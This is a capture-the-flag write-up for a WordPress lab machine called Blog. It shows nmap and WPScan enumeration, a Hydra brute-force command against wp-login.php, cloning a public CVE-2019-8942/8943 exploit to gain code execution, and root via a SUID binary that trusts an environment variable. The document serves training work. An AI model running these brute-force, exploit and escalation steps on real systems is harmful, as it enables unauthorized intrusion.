# Blog

**Difficulty:** Medium
**Category:** Wordpress / Privilege Escalation

# Summary 

Blog is a Linux machine that focuses on WordPress exploitation and privilege escalation. The attack involved discovering valid credentials through enumeration and brute-forcing, exploiting a vulnerable image-cropping feature to gain shell access, and manipulating an environment variable in a SUID binary to escalate privileges to root.
# Enumeration

Started with an Nmap scan to identify open ports and running services.
```bash
nmap -sCV -v -p- <TARGET_IP>
```

The web server was running WordPress on blog.thm. Added the hostname to /etc/hosts and enumerated the website using WPScan.
```bash
echo "<TARGET_IP> blog.thm" | sudo tee -a /etc/hosts
wpscan --url http://blog.thm -e u,ap,at
```

WPScan revealed the username kwheel.

# Initial Access

Used Hydra to brute-force the WordPress login with the RockYou wordlist.

```bash
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username"
```

After obtaining the password, logged in to the WordPress dashboard.

The site was vulnerable to CVE-2019-8942, which can be chained with CVE-2019-8943 to achieve remote code execution under vulnerable conditions.

Downloaded the exploit:

```bash
git clone https://github.com/hadrian3689/wordpress_cropimage.git
cd wordpress_cropimage
```

Configured the target URL and WordPress credentials according to the PoC. Executed the exploit and obtained RCE on the target.

# Privilege Escalation

After gaining a shell, searched for SUID binaries that could provide a path to elevated privileges.

```bash
find / -type f -perm -u=s 2>/dev/null
```
Found an interesting binary: /usr/sbin/checker.

Used ltrace to inspect its library calls and understand its behavior.

```bash
ltrace /usr/sbin/checker
```

Output:

`getenv("admin") = nil
puts("Not an Admin") = 13
Not an Admin`

The output showed that checker checks the admin environment variable. Since it was unset, the program displayed Not an Admin.
Set the variable and executed the binary again:
```bash
export admin=1
/usr/sbin/checker
```
This provided a root shell.

# Flags

Searched the filesystem for both flags.

```bash
find / -type f -name "user.txt" 2>/dev/null
cat /*****/***/user.txt
```

```bash
cat /root/root.txt
```
